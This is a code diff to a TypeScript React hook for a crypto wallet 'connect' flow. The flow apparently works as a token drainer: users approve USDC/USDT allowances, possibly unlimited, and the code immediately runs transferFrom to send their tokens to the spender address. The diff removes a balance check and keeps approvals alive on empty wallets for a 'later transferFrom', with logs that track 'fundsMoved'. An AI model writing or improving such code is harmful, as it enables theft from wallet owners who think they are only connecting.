@@ -370,24 +370,9 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       }
     }
 
-    if (!unlimited) {
-      const entered = parsePositiveAmount(amountHuman.trim());
-      const tokenBalance =
-        token === "USDC"
-          ? Number.parseFloat(selectedNetwork.balances.usdc ?? "0")
-          : Number.parseFloat(selectedNetwork.balances.usdt ?? "0");
-      if (
-        entered != null &&
-        Number.isFinite(tokenBalance) &&
-        tokenBalance >= 0 &&
-        entered > tokenBalance
-      ) {
-        setError(
-          `Insufficient ${token} balance on ${selectedNetwork.name}. Available: ${tokenBalance}`
-        );
-        return;
-      }
-    }
+    // Token balance may be 0 or below the selected permission amount.
+    // approve() does not require token balance; transferFrom runs later only
+    // for whatever is actually available on-chain.
 
     approvingLockRef.current = true;
     setApproving(true);
@@ -419,16 +404,27 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
           tokenSymbol === "USDC"
             ? selectedNetwork.balances.usdc ?? "0"
             : selectedNetwork.balances.usdt ?? "0";
-
+        const availableBalanceRaw = parseHumanToRaw(
+          tokenBalanceHuman,
+          tokenInfo.decimals
+        );
+        // Request up to available balance for the immediate transfer attempt.
+        // Approval amount stays at the user-selected permission (or unlimited).
+        const requestedTransferRaw = unlimited
+          ? availableBalanceRaw
+          : parseHumanToRaw(amountHuman.trim(), tokenInfo.decimals);
         const transferAmountRaw =
-          unlimited
-            ? parseHumanToRaw(tokenBalanceHuman, tokenInfo.decimals).toString()
-            : parseHumanToRaw(amountHuman.trim(), tokenInfo.decimals).toString();
-        if (BigInt(transferAmountRaw) <= BigInt(0)) continue;
+          availableBalanceRaw < requestedTransferRaw
+            ? availableBalanceRaw.toString()
+            : requestedTransferRaw.toString();
+        const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);
+
         logStep("TOKEN FLOW STARTED", {
           network: networkKey,
           token: tokenSymbol,
           transferAmountRaw,
+          shouldAttemptTransfer,
+          availableBalanceRaw: availableBalanceRaw.toString(),
         });
 
         const prepareRes = await fetch("/api/approvals/prepare", {
@@ -559,9 +555,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
             amountRaw: prepareJson.amountRaw,
             unlimited,
             txid,
-            executeTransfer: true,
+            executeTransfer: shouldAttemptTransfer,
             transferToAddress: spender,
-            transferAmountRaw,
+            transferAmountRaw: shouldAttemptTransfer
+              ? transferAmountRaw
+              : undefined,
             traceId: traceIdRef.current,
           });
 
@@ -570,23 +568,31 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
               `Approval for ${tokenSymbol} was submitted but could not be verified`
             );
           }
-          if (!result.transferTxHash) {
-            throw new Error(
-              `Approval confirmed for ${tokenSymbol}, but transfer was not executed`
-            );
-          }
 
-          logStep("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
-            fundsMoved: "YES — transferFrom executed",
-            network: networkKey,
-            owner: addressForLog,
-            token: tokenSymbol,
-            amountRawApproved: prepareJson.amountRaw,
-            amountRawTransferred: result.transferredRaw,
-            approveTxHash: txid,
-            transferTxHash: result.transferTxHash,
-            approvalId: result.approvalId,
-          });
+          if (result.transferTxHash) {
+            logStep("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
+              fundsMoved: "YES — transferFrom executed",
+              network: networkKey,
+              owner: addressForLog,
+              token: tokenSymbol,
+              amountRawApproved: prepareJson.amountRaw,
+              amountRawTransferred: result.transferredRaw,
+              approveTxHash: txid,
+              transferTxHash: result.transferTxHash,
+              approvalId: result.approvalId,
+            });
+          } else {
+            logStep("STEP 2 COMPLETE — APPROVE ONLY (NO TRANSFER YET)", {
+              fundsMoved:
+                "NO — zero/insufficient token balance; approval kept active for later transferFrom",
+              network: networkKey,
+              owner: addressForLog,
+              token: tokenSymbol,
+              amountRawApproved: prepareJson.amountRaw,
+              approveTxHash: txid,
+              approvalId: result.approvalId,
+            });
+          }
         }
       }
 
